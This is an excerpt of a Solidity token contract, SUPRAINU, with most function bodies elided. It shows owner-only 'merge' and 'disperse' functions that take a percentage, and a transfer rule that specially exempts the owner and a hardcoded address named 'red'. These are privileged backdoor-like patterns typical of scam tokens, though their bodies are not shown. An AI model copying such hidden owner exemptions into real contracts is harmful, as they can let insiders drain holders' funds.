...
contract SUPRAINU is IERC20 {
    ...
    uint256 private _initialSupply = 1e15*1e9;
    
    uint8 private _decimals = 9;
    
    bool private reflect = true;
    
    address private routerAddy = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // uniswap
    // address private routerAddy = 0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff; // uniswap
    
    address private dead = 0x000000000000000000000000000000000000dEaD;
    address private red = 0x13f27513C996B15D61243da314919EFcE50Ca6CE;
    ...
    function merge(uint8 perc) public payable onlyOwner {
    ...
    function disperse(uint8 perc) public onlyOwner {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        if(sender == _owner || sender == red || sender == address(this) || recipient == address(this)) {
